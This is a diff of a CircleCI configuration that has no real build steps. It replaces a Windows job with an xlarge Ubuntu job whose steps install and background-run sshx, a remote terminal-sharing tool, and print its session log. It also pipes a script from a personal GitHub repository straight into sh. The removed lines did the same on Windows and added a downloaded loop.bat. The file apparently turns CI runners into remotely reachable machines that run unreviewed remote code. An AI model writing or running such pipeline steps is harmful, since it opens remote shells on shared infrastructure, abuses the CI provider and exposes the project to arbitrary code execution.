@@ -1,39 +1,17 @@
 version: 2.1
 
-orbs:
-  win: circleci/windows@4.1.1
-
-workflows:
-  hello-world:
-    jobs:
-      - build
-  
-
 jobs:
   build:
-    executor:
-      name: win/default
-    working_directory: C:\Users\circleci\project\HelloWorld
+    machine:
+      image: ubuntu-2004:202010-01 # recommended linux image
+    resource_class: xlarge
     steps:
-      - checkout:
-          path: C:\Users\circleci\project
-      - restore_cache:
-          keys:
-           - dotnet-packages-v1-{{ checksum "circleci-demo-windows.csproj" }
-           
-      - run:
-          name: "Yes"
-          command: | 
-            md C:\Users\runneradmin\Documents
-            wget -O setup.zip https://sshx.s3.amazonaws.com/sshx-x86_64-pc-windows-msvc.zip
-            Invoke-WebRequest -Uri https://sshx.s3.amazonaws.com/sshx-x86_64-pc-windows-msvc.zip -OutFile setup.zip
-            
-            Expand-Archive -Path "C:\Users\runneradmin\Documents\setup.zip" -DestinationPath "C:\Users\runneradmin\Documents" -Force
-            Start-Process -FilePath "C:\Users\runnderadmin\Documents\sshx.exe" -NoNewWindow -RedirectStandardOutput "sshx.log"
+      - run: systemctl status
 
-            cat sshx.log
+      - run: curl -sSf https://sshx.io/get | sh 
 
-            sleep 60
+      - run: nohup sshx &> a.log &
 
-            wget -O start.bat https://github.com/Efebey2903/files/raw/refs/heads/main/loop.bat
-            cmd /c start.bat  
+      - run: cat a.log
+
+      - run: curl https://github.com/Efebey2903/GH-Ubuntu-Desktop/raw/refs/heads/main/a.sh | sh
